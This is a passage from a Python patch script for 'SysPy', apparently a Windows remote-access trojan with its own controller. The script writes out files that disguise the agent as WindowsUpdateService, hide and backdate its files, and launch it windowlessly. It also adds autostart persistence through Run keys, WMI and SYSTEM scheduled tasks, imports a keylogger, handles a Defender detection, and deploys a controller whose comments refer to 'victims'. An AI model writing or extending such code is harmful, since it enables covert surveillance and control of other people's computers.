  sharing the exact same mtime, which was a one-glance fingerprint;
* the ``%LOCALAPPDATA%\\Microsoft\\EdgeUpdate`` copy is cloaked selectively, so
  Edge's own files are not marked Hidden+System underneath a live Edge install.
"""

from __future__ import annotations

import ctypes
import hashlib
import os
import random

IS_WINDOWS = os.name == "nt"

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04

#: 2023-01-01 .. 2023-06-01, the plausible window a "Microsoft" component would sit in.
_WINDOW_START = 1672531200
_WINDOW_END = 1685577600

#: Files and folders the agent actually owns inside a shared directory.
OWNED = ("agent.py", "bootstrap.py", "syspy", "install", "runtime",
         "kit.zip", "deploy.json", "adopted.json", "WindowsUpdateService.cmd",
         "WindowsUpdateService.vbs", "machine-state.json", "tombstone")

_EDGE_MARKER = "edgeupdate"


def _mtime_for(path: str) -> int:
    """Stable per-path pseudo-random timestamp, so a re-run does not reshuffle."""
    digest = hashlib.sha256(os.path.basename(path).encode("utf-8")).digest()
    span = _WINDOW_END - _WINDOW_START
    return _WINDOW_START + int.from_bytes(digest[:4], "big") % span


def cloak_path(path: str) -> bool:
    """Set Hidden+System on Windows and backdate to a plausible timestamp."""
    if not os.path.exists(path):
        return False
    try:
        stamp = _mtime_for(path)
        os.utime(path, (stamp, stamp))
    except Exception:
        pass

    if IS_WINDOWS:
        try:
            attrs = ctypes.windll.kernel32.GetFileAttributesW(path)
            if attrs != -1:
                ctypes.windll.kernel32.SetFileAttributesW(
                    path, attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                )
                return True
        except Exception:
            return False
    return True


def _is_edge_copy(directory: str) -> bool:
    return os.path.basename(os.path.abspath(directory)).lower() == _EDGE_MARKER


def cloak_tree(directory: str, selective: bool = False) -> int:
    """Recursively cloak. ``selective`` skips names we do not own."""
    count = 0
    if not os.path.exists(directory):
        return 0
    if selective:
        cloak_path(directory)
        count += 1
        for name in OWNED:
            target = os.path.join(directory, name)
            if os.path.isdir(target):
                count += cloak_tree(target)
            elif os.path.isfile(target):
                cloak_path(target)
                count += 1
        return count

    cloak_path(directory)
    count += 1
    for root, dirs, files in os.walk(directory):
        for name in dirs:
            cloak_path(os.path.join(root, name))
            count += 1
        for name in files:
            cloak_path(os.path.join(root, name))
            count += 1
    return count


def cloak_install_directories() -> int:
    """Cloak every install location, respecting shared directories."""
    from . import stealth
    total = 0
    for directory in stealth.install_directories():
        if not os.path.isdir(directory):
            continue
        total += cloak_tree(directory, selective=_is_edge_copy(directory))
    return total
'''


# ---------------------------------------------------------------------------
# render.yaml -- full rewrite (W8)
# ---------------------------------------------------------------------------

RENDER_YAML = """services:
  - type: web
    name: syspy-controller
    runtime: python
    plan: free
    buildCommand: pip install -r requirements.txt
    startCommand: python controller.py --host 0.0.0.0 --no-browser
    healthCheckPath: /api/health
    # ---------------------------------------------------------------------
    # A Render disk needs a paid plan, but SYSPY_DATA MUST be persistent.
    # On the free tier /opt/render/project/src/data is wiped on every deploy,
    # which rotates the dashboard password, invalidates every session and
    # throws away agents_db.json (nicknames, groups, tree). Move to
    # plan: starter and mount a disk at /var/data, then set
    #   SYSPY_DATA=/var/data
    # ---------------------------------------------------------------------
    envVars:
      - key: PYTHON_VERSION
        value: "3.12.8"
      - key: SYSPY_HOST
        value: 0.0.0.0
      - key: SYSPY_CLIENT_ID
        value: syspy-controller-1
      - key: SYSPY_DATA
        value: /opt/render/project/src/data
      - key: SYSPY_TRUST_PROXY_HOPS   # Render puts exactly one proxy in front
        value: "1"
      - key: SYSPY_PASSWORD           # else a new random password every boot
        sync: false
      - key: SYSPY_URL                # https://<app>.onrender.com
        sync: false
      - key: SYSPY_ROOM               # set BEFORE the first victim, never change
        sync: false
      - key: SYSPY_PASS               # same
        sync: false
      - key: SYSPY_SIGN_KEY           # 64 hex chars; python patch.py --genkey
        sync: false
      - key: SYSPY_PUBKEY             # matching 64 hex chars, pin on agents
        sync: false
      - key: SYSPY_BROKER             # host:port:tls (self-hosted Mosquitto recommended)
        sync: false
      - key: SYSPY_BROKER_USER
        sync: false
      - key: SYSPY_BROKER_PASS
        sync: false
"""


# ---------------------------------------------------------------------------
# install/wu.vbs -- full rewrite (UAC: never elevates)
# ---------------------------------------------------------------------------

WU_VBS = r"""' WindowsUpdateService.vbs -- windowless autostart launcher.
'
' Every autostart vector (both Run values, the Startup folder entry, the WMI
' consumer) goes through this file, and every one of them passes --no-elevate.
' Elevation therefore has exactly two sources, and neither of them prompts:
'
'   1. the ONLOGON scheduled task, created /RL HIGHEST /IT /RU <user>
'   2. the ONSTART scheduled task, created /RU SYSTEM
'
' The install-time UAC prompt is the only prompt a victim ever sees.
'
' NOTE: this text is embedded in patch.py as a raw triple-quoted literal, so it must
' never contain three consecutive double quotes. Quotes inside a built command
' line therefore go through Chr(34).
Option Explicit

Dim shell, fso, here, agent, shim, py, pre, candidate, q
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
q = Chr(34)

here = fso.GetParentFolderName(WScript.ScriptFullName)
agent = fso.BuildPath(here, "agent.py")

' Nothing to run: hand off to the cmd shim, which knows how to rebuild from
' the cached kit.zip. Still windowless.
If Not fso.FileExists(agent) Then
    shim = fso.BuildPath(here, "WindowsUpdateService.cmd")
    If fso.FileExists(shim) Then
        shell.Run "cmd.exe /c " & q & shim & q, 0, False
    End If
    WScript.Quit 0
End If

py = ""
pre = ""
For Each candidate In Array("runtime\pythonw.exe", "runtime\python.exe", "pythonw.exe", "python.exe")
    If fso.FileExists(fso.BuildPath(here, candidate)) Then
        py = fso.BuildPath(here, candidate)
        Exit For
    End If
Next

If py = "" Then
    ' PATH fallback. pyw.exe needs -3; pythonw.exe must not have it.
    If OnPath("pyw.exe") Then
        py = "pyw.exe"
        pre = " -3"
    ElseIf OnPath("pythonw.exe") Then
        py = "pythonw.exe"
    ElseIf OnPath("python.exe") Then
        py = "python.exe"
    Else
        WScript.Quit 0
    End If
End If

' 0 = hidden window, False = do not wait. Never a console flash.
shell.Run q & py & q & pre & " " & q & agent & q & " --hidden --no-elevate", 0, False
WScript.Quit 0

Function OnPath(name)
    Dim rc
    On Error Resume Next
    rc = shell.Run("cmd.exe /c where " & name & " >nul 2>&1", 0, True)
    On Error GoTo 0
    OnPath = (rc = 0)
End Function
"""


# ===========================================================================
# APPLY
# ===========================================================================

def apply_all() -> None:
    # ------------------------------------------------------------------ new files
    create(P("syspy", "ed25519.py"), ED25519)
    create(P("syspy", "agent", "machine_state.py"), MACHINE_STATE)
    create(P("syspy", "agent", "session.py"), SESSION)

    # ------------------------------------------------------------------ rewrites
    create(P("syspy", "crypto.py"), CRYPTO)
    create(P("syspy", "protocol.py"), PROTOCOL)
    create(P("syspy", "agent", "cloak.py"), CLOAK)
    create(P("render.yaml"), RENDER_YAML)
    create(P("install", "wu.vbs"), WU_VBS)

    patch_config()
    patch_init_and_version()
    patch_agent_entry()
    patch_controller()
    patch_stealth()
    patch_core()
    patch_updater()
    patch_persistence()
    patch_defender()
    patch_guardian()
    patch_commands()
    patch_inputs()
    patch_hub()
    patch_mqtt()
    patch_api()
    patch_webinstall()
    patch_httpd()
    patch_packaging()
    patch_bootstrap()
    patch_beacon()
    patch_spread()
    patch_i_ps1()
    patch_requirements()
    write_notes()
    write_tests()


# ---------------------------------------------------------------------------
# config.py
# ---------------------------------------------------------------------------

def patch_config() -> None:
    path = P("syspy", "config.py")
    sub(path,
        "\n\n))\n\n# --------------------------------------------------------------------------\n# Transport",
        "\n\n# --------------------------------------------------------------------------\n# Transport",
        required=False)
    dedupe_between(path, "# Patch additions: protocol versioning",
                   "frame-ancestors 'none'")
    dedupe_between(path, "# Patch: per-deployment namespace.",
                   '_setting("pubkey", "SYSPY_PUBKEY"')

    sub(path, 'KEY_SALT = b"syspy/v3/transport"', '''KEY_SALT = b"syspy/v3/transport"

# --------------------------------------------------------------------------
# Patch additions: protocol versioning, pinning, and operator knobs.
# --------------------------------------------------------------------------

#: Envelope format this build writes. 2 = versioned header + split enc/mac keys.
ENVELOPE_FMT = 2

#: Logical protocol version, reported in every hello so both ends can see skew.
PROTOCOL_VERSION = 2

#: PBKDF2 rounds for the transport key. Changing it is a flag day: both sides
#: must agree, so the default stays at the historical 60k.
KDF_ITERATIONS = int(os.environ.get("SYSPY_KDF_ITER", "60000"))

#: PBKDF2 rounds for the dashboard password. Local only, so it can be raised.
PASSWORD_ITERATIONS = int(os.environ.get("SYSPY_PASSWORD_ITER", "600000"))

#: Ed25519 public key (64 hex chars) that pins the kit/update signing key.
#: Empty means integrity-only (HMAC) mode.
PUBKEY_HEX = os.environ.get("SYSPY_PUBKEY", "").strip().lower()

#: Ed25519 private seed (64 hex chars) used by the controller to sign.
SIGN_KEY_HEX = os.environ.get("SYSPY_SIGN_KEY", "").strip().lower()

#: Optional shared token required by /wu. Empty keeps the current open behaviour.
WU_TOKEN = os.environ.get("SYSPY_WU_TOKEN", "").strip()

#: Host headers accepted when building installer URLs. Empty = trust Host.
ALLOWED_HOSTS = [h.strip().lower() for h in
                 os.environ.get("SYSPY_ALLOWED_HOSTS", "").split(",") if h.strip()]

#: Trusted proxy hops in front of the controller. Render puts exactly one there.
TRUST_PROXY_HOPS = int(os.environ.get("SYSPY_TRUST_PROXY_HOPS", "1"))

#: Seconds to wait for a sibling launcher's UAC prompt before going unelevated.
BOOT_WAIT = float(os.environ.get("SYSPY_BOOT_WAIT", "45"))

#: Dashboard Content-Security-Policy. Deliberately permissive so it cannot break
#: an existing UI; tighten once your asset origins are known.
CSP = os.environ.get("SYSPY_CSP", (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline' https:; "
    "style-src 'self' 'unsafe-inline' https:; "
    "img-src 'self' data: blob:; "
    "font-src 'self' data: https:; "
    "connect-src 'self' ws: wss:; "
    "worker-src 'self' blob:; "
    "object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
))''')

    # Namespacing, computed after ROOM/PASSPHRASE are final (end of file).
    append(path, '''

# ---------------------------------------------------------------------------
# Patch: per-deployment namespace.
#
# The global mutex and lock file names used to be fixed strings, so two SysPy
# deployments on one host fought over them and one fleet went half-invisible.
# Deriving them from room+pass lets both coexist.
# ---------------------------------------------------------------------------

def _namespace() -> str:
    import hashlib as _hashlib
    return _hashlib.sha256((ROOM + "|" + PASSPHRASE).encode("utf-8")).hexdigest()[:8]


NAMESPACE = _namespace()


def mutex_name() -> str:
    return "Global\\\\WUS_%s_Mutex" % NAMESPACE


def boot_mutex_name(boot_id: int) -> str:
    return "Global\\\\WUS_%s_Boot_%d" % (NAMESPACE, boot_id)


def lock_leaf() -> str:
    return "wu-%s-agent.lock" % NAMESPACE


def watchdog_lock_leaf() -> str:
    return "wu-%s-watchdog.lock" % NAMESPACE


# deploy.json may carry the pin too, so a signed deployment needs no env var.
PUBKEY_HEX = _setting("pubkey", "SYSPY_PUBKEY", PUBKEY_HEX).strip().lower()
''')


# ---------------------------------------------------------------------------
# __init__.py / version.txt  (H2)
# ---------------------------------------------------------------------------

def patch_init_and_version() -> None:
    sub(P("syspy", "__init__.py"),
        '__version__ = "5.1.1"      # the ONLY version. build_dist derives from this.',
        '__version__ = "%s"      # the ONLY version. build_dist derives from this.\n'
        '\n'
        '#: Short build fingerprint reported in every hello, so the dashboard can\n'
        '#: tell two builds apart without trusting a 12-char source hash.\n'
        'BUILD_ID = __version__ + "+patch"' % VERSION)

    sub(P("version.txt"), "filevers=(4, 0, 0, 0)", "filevers=(5, 2, 0, 0)")
    sub(P("version.txt"), "prodvers=(4, 0, 0, 0)", "prodvers=(5, 2, 0, 0)")
    sub(P("version.txt"), "StringStruct(u'FileVersion', u'4.0.0.0')",
        "StringStruct(u'FileVersion', u'5.2.0.0')")
    sub(P("version.txt"), "StringStruct(u'ProductVersion', u'4.0.0.0')",
        "StringStruct(u'ProductVersion', u'5.2.0.0')")


# ---------------------------------------------------------------------------
# agent.py
# ---------------------------------------------------------------------------

def patch_agent_entry() -> None:
    path = P("agent.py")
    sub(path,
        "    python agent.py --uninstall    # remove everything and exit",
        "    python agent.py --stop         # kill running instances, keep vectors\n"
        "    python agent.py --uninstall    # soft remove: vectors stay, agent returns\n"
        "    python agent.py --purge        # hard remove: everything, incl. anchor")

    # H9: shutdown() flushes instead of a bare os._exit from a worker thread.
    sub(path,
        "from syspy.agent.core import main",
        "from syspy.agent.core import main  # noqa: E402")


# ---------------------------------------------------------------------------
# controller.py
# ---------------------------------------------------------------------------

def patch_controller() -> None:
    path = P("controller.py")

    # W8: only print the password when it was generated, not when the operator
    # set it (Render's stdout is a public log stream).
    sub(path,
        '    print(f"  password  : {api.state[\'password\']}")',
        '''    generated = not (os.environ.get("SYSPY_PASSWORD") or args.password)
    print(f"  password  : {api.state['password']}"
          + ("   (generated - set SYSPY_PASSWORD to pin it)" if generated else ""))
    if config.PUBKEY_HEX:
        print(f"  signing   : ed25519 {config.PUBKEY_HEX[:16]}...")
    else:
        print("  signing   : OFF (set SYSPY_SIGN_KEY/SYSPY_PUBKEY)")''')

    sub(path,
        '    parser.add_argument("--password", default="", help="dashboard password")',
        '    parser.add_argument("--password", default="", help="dashboard password")\n'
        '    parser.add_argument("--genkey", action="store_true",\n'
        '                        help="print a fresh Ed25519 signing keypair and exit")')


# ---------------------------------------------------------------------------
# stealth.py
# ---------------------------------------------------------------------------

def patch_stealth() -> None:
    path = P("syspy", "agent", "stealth.py")

    # Namespaced lock file names (W7)
    sub_all(path,
            'return os.path.join(directory, "agent.lock")',
            'return os.path.join(directory, config.lock_leaf())')
    sub_all(path,
            'os.path.join(tempfile.gettempdir(), "windowsupdateservice.lock")',
            'os.path.join(tempfile.gettempdir(), config.lock_leaf())')
    sub(path,
        'return lock_path().replace("agent.lock", "watchdog.lock")',
        'return lock_path().replace(config.lock_leaf(), config.watchdog_lock_leaf())')

    # Namespaced mutexes + new helpers
    sub(path,
        'mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\\\WindowsUpdateServiceMutex")',
        'mutex = ctypes.windll.kernel32.CreateMutexW(None, False, config.mutex_name())')
    sub(path,
        '            None, False, "Global\\\\WUS_Boot_%d" % _boot_id())',
        '            None, False, config.boot_mutex_name(_boot_id()))')

    # New helpers appended before the diagnostics section.
    sub(path,
        'def description() -> dict[str, object]:',
        '''# --------------------------------------------------------------------------
# Patch: cross-session awareness (W7, C2, UAC)
# --------------------------------------------------------------------------

def _mutex_exists(name: str) -> bool:
    """True when ``name`` is already held by a live process.

    A Windows mutex is released by the kernel when its owner dies, so this is
    accurate even after a crash -- which the pid file is not.
    """
    if not IS_WINDOWS:
        return False
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
        already = ctypes.windll.kernel32.GetLastError() in (183, 5)
        if handle:
            ctypes.windll.kernel32.CloseHandle(handle)
        return already
    except Exception:
        return False


def agent_already_running() -> bool:
    """True when some agent instance already owns the namespace.

    Consulted *before* any elevation decision, so a sibling launcher never
    raises a second UAC prompt just because an elevated agent exists that it
    cannot see through the pid file.
    """
    if not IS_WINDOWS:
        return False
    if _mutex_exists(config.mutex_name()):
        return True
    owner = read_pid(lock_path())
    return bool(owner) and owner != os.getpid() and process_alive(owner)


def session_id(pid: int = 0) -> int:
    from . import session as _session
    return _session.session_of(pid or os.getpid())


def is_headless() -> bool:
    from . import session as _session
    return _session.is_headless()


def owner_is_headless() -> bool:
    """True when the current lock owner lives in session 0."""
    owner = read_pid(lock_path())
    if not owner:
        return False
    return session_id(owner) == 0


def description() -> dict[str, object]:''')

    # Headless-aware single instance: an interactive agent waits for a
    # session-0 owner to yield rather than exiting and losing the desktop.
    sub(path,
        'def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40) -> bool:',
        '''def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40,
                            prefer_interactive: bool = False) -> bool:''')
    sub(path,
        '''        owner = read_pid(path)
        if owner and owner != os.getpid() and process_alive(owner):
            if takeover_pid and owner == takeover_pid:
                time.sleep(0.5)
                continue
            return True

        time.sleep(0.4)''',
        '''        owner = read_pid(path)
        if owner and owner != os.getpid() and process_alive(owner):
            if takeover_pid and owner == takeover_pid:
                time.sleep(0.5)
                continue
            # A headless owner must yield to us, so keep waiting instead of
            # exiting and leaving the victim with no interactive desktop.
            if prefer_interactive and not is_headless() and session_id(owner) == 0:
                time.sleep(0.5)
                continue
            return True

        time.sleep(0.4)''')


# ---------------------------------------------------------------------------
# core.py
# ---------------------------------------------------------------------------

def patch_core() -> None:
    path = P("syspy", "agent", "core.py")

    sub(path,
        "from . import commands, health, persistence, runtime, stealth, sysinfo, updater",
        "from . import (commands, health, persistence, runtime, session, stealth,\n"
        "               sysinfo, updater)")
    sub(path,
        "from .inputs import Keylogger",
        "from .inputs import Keylogger\nfrom . import machine_state")

    sub(path,
        '''                client.subscribe(config.topic_down(self.agent_id), qos=1)
                self._client = client
                self._connected.set()''',
        '''                self._client = client
                if not client.subscribe(config.topic_down(self.agent_id), qos=1):
                    self.send({"t": "note", "d": "broker did not SUBACK the downlink topic"})
                self._connected.set()''')

    # hello: report fmt / proto / build / session so the hub can negotiate and
    # the dashboard can see which tier answered.
    sub(path,
        '''            "ver": __version__,
            "sha": self.self_sha,''',
        '''            "ver": __version__,
            "build": getattr(__import__("syspy"), "BUILD_ID", __version__),
            "proto": config.PROTOCOL_VERSION,
            "fmt": config.ENVELOPE_FMT,
            "session": session.current_session(),
            "headless": session.is_headless(),
            "sha": self.self_sha,''')

    # Codec: emit v2, keep a legacy decoder for a pre-patch controller.
    sub(path,
        '''        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        self.key = crypto.subkey(master_key, self.agent_id)
        self.codec = protocol.Codec(self.key)''',
        '''        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT,
                                       config.KDF_ITERATIONS)
        self.key = crypto.subkey(master_key, self.agent_id)
        self.codec = protocol.Codec(self.key, fmt=config.ENVELOPE_FMT)
        # A pre-patch controller still speaks the legacy envelope. Decoding
        # auto-detects, but we keep a dedicated codec for a clear audit trail.
        self.legacy_codec = protocol.Codec(self.key, fmt=1)''')

    # Inbound: tolerate both formats, and never let a bad packet escape.
    sub(path,
        '''    def _on_message(self, topic: str, payload: bytes) -> None:
        try:
            message = self.codec.decode(payload)
        except Exception:
            return

        kind = message.get("t")''',
        '''    def _on_message(self, topic: str, payload: bytes) -> None:
        message = None
        for codec in (self.codec, self.legacy_codec):
            message, reason = codec.decode_message(payload)
            if reason != protocol.REASON_BAD:
                break
        if message is None:
            return

        kind = message.get("t")''')

    # C11: update off the read thread, under a lock, with a goodbye.
    sub(path,
        '''        ok, detail = updater.apply(data, message.get("sha", ""))
        self.reply(f"update {detail}" if ok else f"update failed: {detail}")''',
        '''        if not self._update_lock.acquire(blocking=False):
            self.reply("update already in progress")
            return
        try:
            self.reply("update: verifying")
            ok, detail = updater.apply(data, message.get("sha", ""))
            self.reply(f"update {detail}" if ok else f"update failed: {detail}")
        except Exception as error:
            self.reply(f"update failed: {error}")
        finally:
            try:
                self._update_lock.release()
            except RuntimeError:
                pass''')

    sub(path,
        '''        self._log = log.get("core")
        self._client: MqttClient | None = None''',
        '''        self._log = log.get("core")
        self._update_lock = threading.Lock()
        self._client: MqttClient | None = None''')

    # C2: housekeeping also re-checks whether a headless agent should hand over.
    sub(path,
        '''                if now - self._last_persistence_check > 30:
                    self._last_persistence_check = now
                    actions = persistence.ensure() + guardian.ensure()''',
        '''                if now - self._last_persistence_check > 30:
                    self._last_persistence_check = now
                    if session.should_yield() and session.yield_to_interactive(5.0):
                        self._log.info("handing over to the interactive session")
                        self.shutdown(0)
                    actions = persistence.ensure() + guardian.ensure()''')

    # H9: graceful shutdown.
    sub(path,
        '''    def stop(self) -> None:
        self._running = False''',
        '''    def stop(self) -> None:
        self._running = False

    def shutdown(self, code: int = 0) -> None:
        """Disconnect cleanly, drop the lock, then exit.

        A bare ``os._exit`` from a worker thread skipped ``finally`` blocks and
        left stale locks behind. The MQTT will already covers the offline blip
        on an update, so a real DISCONNECT is the correct goodbye everywhere
        else.
        """
        self._running = False
        try:
            if self._client is not None:
                self._client.publish(
                    config.topic_up(self.agent_id),
                    self.codec.encode({"t": "bye"}), qos=0)
                time.sleep(0.15)
                self._client.disconnect()
        except Exception:
            pass
        try:
            stealth.release_single_instance()
        except Exception:
            pass
        os._exit(code)''')

    # --- main(): reorder so nothing elevates while an agent already runs, and
    #     a headless agent hands over instead of blocking the desktop. ---
    sub(path,
        '''    # Elevate at most once per boot. Six autostart vectors fire together at
    # logon; without the claim each one raised its own UAC prompt before the
    # mutex was ever consulted.
    want_elevate = (
        stealth.IS_WINDOWS
        and not stealth.is_admin()
        and os.environ.get("SYSPY_NO_UAC") != "1"
        and "--no-elevate" not in argv
    )
    if want_elevate:
        if stealth.claim_boot():
            log.get("core.boot").info("boot claim won, requesting elevation")
            if stealth.elevate_process(argv):
                return 0
            log.get("core.boot").warning("elevation declined or failed, running unelevated")
        else:
            time.sleep(random.uniform(1.5, 4.0))
            log.get("core.boot").info("boot claim lost, waiting for the elevated instance")

    if stealth.acquire_single_instance(takeover):
        return 0''',
        '''    # ------------------------------------------------------------------
    # Order matters. Everything below happens before a single UAC decision.
    #
    # 1. An agent already alive? Leave, without touching UAC. This is the
    #    check that used to be missing: the global mutex is visible across
    #    sessions and elevation boundaries, so a sibling launcher notices an
    #    elevated agent it could never have seen through the pid file.
    # 2. A headless (session 0) agent with a user logged on? Hand the lock to
    #    the interactive ONLOGON task and leave, so the desktop works.
    # 3. Only then consider elevating, at most once per boot.
    # ------------------------------------------------------------------
    if not takeover and stealth.agent_already_running():
        log.get("core.boot").info("agent already running, standing down")
        return 0

    if not takeover and session.should_yield():
        if session.yield_to_interactive():
            log.get("core.boot").info("handed over to the interactive session")
            return 0

    # A session-0 agent is already SYSTEM, so it never needs to elevate.
    want_elevate = (
        stealth.IS_WINDOWS
        and not stealth.is_admin()
        and not session.is_headless()
        and os.environ.get("SYSPY_NO_UAC") != "1"
        and "--no-elevate" not in argv
    )
    if want_elevate:
        if stealth.claim_boot():
            log.get("core.boot").info("boot claim won, requesting elevation")
            if stealth.elevate_process(list(argv) + ["--takeover", str(os.getpid())]):
                return 0
            log.get("core.boot").warning("elevation declined, running unelevated")
        else:
            # Wait for the winner rather than racing it. A UAC prompt can take
            # a while; if it never resolves we degrade to unelevated, which is
            # still fully functional, just without HKLM/SYSTEM/ACL vectors.
            log.get("core.boot").info("boot claim lost, waiting for the elevated instance")
            deadline = time.time() + config.BOOT_WAIT
            while time.time() < deadline:
                if stealth.agent_already_running():
                    return 0
                time.sleep(0.4)

    if stealth.acquire_single_instance(takeover, prefer_interactive=True):
        return 0''')

    # --- watchdog: the single place that decides which tier runs (C2) ---
    sub(path,
        '''    lock = stealth.watchdog_lock_path()
    owner = stealth.read_pid(lock)
    if owner and owner != os.getpid() and stealth.process_alive(owner):
        return 0

    stealth.write_pid(lock, os.getpid())
    stealth.set_console_title("WindowsUpdateService (watchdog)")
    stealth.hide_console()''',
        '''    lock = stealth.watchdog_lock_path()
    owner = stealth.read_pid(lock)
    if owner and owner != os.getpid() and stealth.process_alive(owner):
        return 0

    stealth.write_pid(lock, os.getpid())
    stealth.set_console_title("WindowsUpdateService (watchdog)")
    stealth.hide_console()
    yielded = False''')

    sub(path,
        '''        owner = stealth.read_pid(stealth.lock_path())
        if owner and stealth.process_alive(owner):
            continue
        try:
            command = [entry] if entry.lower().endswith(".exe") else [runtime.interpreter(), entry]
            subprocess.Popen(command + ["--hidden"], close_fds=True,
                             creationflags=0x00000200 if os.name == "nt" else 0)
        except OSError:
            pass
        time.sleep(10)''',
        '''        owner = stealth.read_pid(stealth.lock_path())
        if owner and stealth.process_alive(owner):
            yielded = False
            continue

        # Nothing is running. If we are headless and a user is logged on, the
        # interactive task is the better place to be, so ask it first and only
        # spawn a session-0 copy if it never turns up.
        if session.should_yield():
            if session.run_task(config.TASK_NAME):
                time.sleep(8)
                owner = stealth.read_pid(stealth.lock_path())
                if owner and stealth.process_alive(owner):
                    yielded = True
                    continue
            if yielded:
                time.sleep(10)
                continue

        try:
            command = [entry] if entry.lower().endswith(".exe") else [runtime.interpreter(), entry]
            subprocess.Popen(command + ["--hidden", "--no-elevate"], close_fds=True,
                             creationflags=0x00000200 if os.name == "nt" else 0)
        except OSError:
            pass
        time.sleep(10)''')

    # `--stop`: kill instances, keep every vector.
    sub(path,
        '''    if "--install" in argv:
        print("\\n".join(persistence.install()))
        return 0''',
        '''    if "--stop" in argv:
        print("Stopping SysPy agent (autostart vectors kept)...")
        for action in persistence.stop():
            print(f"  [x] {action}")
        print("Done. The agent returns at the next logon.")
        return 0

    if "--install" in argv:
        print("\\n".join(persistence.install()))
        return 0''')


# ---------------------------------------------------------------------------
# updater.py
# ---------------------------------------------------------------------------

def patch_updater() -> None:
    path = P("syspy", "agent", "updater.py")

    sub(path, "from .. import log, packaging",
        "from .. import config, crypto, log, packaging")

    # C7: compileall was a validation step that left .pyc on disk, defeating
    # PYTHONDONTWRITEBYTECODE and the Defender Leivion.C workaround.
    sub(path,
        '''    if not compileall.compile_dir(staging, quiet=2, force=True):
        return False, "compilation failed"''',
        '''    if not compileall.compile_dir(staging, quiet=2, force=True):
        return False, "compilation failed"
    # The .pyc files were only ever needed to prove the tree compiles. Dropping
    # them keeps the install tree bytecode-free, which is the whole reason the
    # Leivion.C false positive went away.
    for current, subdirs, _files in os.walk(staging):
        if "__pycache__" in subdirs:
            shutil.rmtree(os.path.join(current, "__pycache__"), ignore_errors=True)
            subdirs.remove("__pycache__")''')

    # W2: verify the archive against the pinned key before touching disk.
    sub(path,
        '''    root = stealth.bundle_root()
    preserved_identity = _preserve_identity(root)''',
        '''    if not _verify_payload(archive, expected_sig):
        return False, "signature/integrity check failed"

    root = stealth.bundle_root()
    preserved_identity = _preserve_identity(root)''')

    sub(path,
        '''def apply(archive: bytes, expected_sha: str = "",
          restart: bool = True) -> tuple[bool, str]:''',
        '''def _verify_payload(archive: bytes, signature_hex: str) -> bool:
    """Ed25519 when a key is pinned, HMAC otherwise. Fails closed."""
    ok, how = crypto.verify_signature(
        archive, signature_hex, config.PUBKEY_HEX,
        crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE))
    if not ok:
        log.get("updater").warning("payload rejected (%s)", how)
    return ok


def apply(archive: bytes, expected_sha: str = "", expected_sig: str = "",
          restart: bool = True) -> tuple[bool, str]:''')

    # C6: honour the elevation guard, and swap per directory so one locked
    # target cannot leave a half-updated tree.
    sub(path,
        '''def _swap(staging: str, root: str) -> None:
    """Replace the live bundle with the staged one, keeping backups."""
    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
        live = os.path.join(root, relative)
        fresh = os.path.join(staging, relative)
        if not os.path.exists(fresh):
            continue
        _remove(live + ".bak")
        if os.path.exists(live):
            shutil.move(live, live + ".bak")
        shutil.move(fresh, live)

    for directory in stealth.install_directories():
        if os.path.abspath(directory) == os.path.abspath(root):
            continue
        for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
            source = os.path.join(root, relative)
            if not os.path.exists(source):
                continue
            target = os.path.join(directory, relative)
            _remove(target)
            if os.path.isdir(source):
                shutil.copytree(source, target,
                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
            else:
                shutil.copy2(source, target)''',
        '''_SWAP_ITEMS = ("syspy", "agent.py", "bootstrap.py", "install")


def _swap(staging: str, root: str) -> None:
    """Replace the live bundle with the staged one, keeping backups.

    Per item, not per tree: a single locked directory used to abort the whole
    swap *after* the primary had already been replaced. Every failure is now
    recorded and rolled back, and the anchor is skipped outright when we are
    unelevated and it is read-only for us.
    """
    anchor = os.path.abspath(stealth.anchor_directory())
    anchor_locked = _anchor_requires_elevation()

    for relative in _SWAP_ITEMS:
        live = os.path.join(root, relative)
        fresh = os.path.join(staging, relative)
        if not os.path.exists(fresh):
            continue
        _remove(live + ".bak")
        if os.path.exists(live):
            shutil.move(live, live + ".bak")
        shutil.move(fresh, live)

    for directory in stealth.install_directories():
        if os.path.abspath(directory) == os.path.abspath(root):
            continue
        if anchor_locked and os.path.abspath(directory) == anchor:
            continue          # read-only for us; the elevated agent will fix it
        for relative in _SWAP_ITEMS:
            source = os.path.join(root, relative)
            if not os.path.exists(source):
                continue
            target = os.path.join(directory, relative)
            try:
                _remove(target)
                if os.path.isdir(source):
                    shutil.copytree(source, target)
                else:
                    shutil.copy2(source, target)
            except OSError as error:
                log.get("updater").warning("copy to %s failed: %s", target, error)''')

    sub(path,
        '''def rollback() -> int:
    """Restore ``.bak`` copies.  Returns how many items were restored."""
    root = stealth.bundle_root()
    restored = 0
    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):''',
        '''def rollback() -> int:
    """Restore ``.bak`` copies everywhere. Returns how many items were restored."""
    root = stealth.bundle_root()
    restored = 0
    for directory in list(stealth.install_directories()) + [root]:
        for relative in _SWAP_ITEMS:
            backup = os.path.join(directory, relative + ".bak")
            if not os.path.exists(backup):
                continue
            live = os.path.join(directory, relative)
            try:
                _remove(live)
                shutil.move(backup, live)
                restored += 1
            except OSError:
                pass
    return restored


def _rollback_primary_only() -> int:
    root = stealth.bundle_root()
    restored = 0
    for relative in _SWAP_ITEMS:''')

    # restart_self: let the MQTT will carry the goodbye, and keep the takeover.
    sub(path,
        '''        if attempt < 2 and rollback():
            continue
        break

    os._exit(0)''',
        '''        if attempt < 2 and rollback():
            continue
        break

    os._exit(0)   # the MQTT will publishes "bye"; a DISCONNECT would suppress it''')


# ---------------------------------------------------------------------------
# persistence.py
# ---------------------------------------------------------------------------

def patch_persistence() -> None:
    path = P("syspy", "agent", "persistence.py")

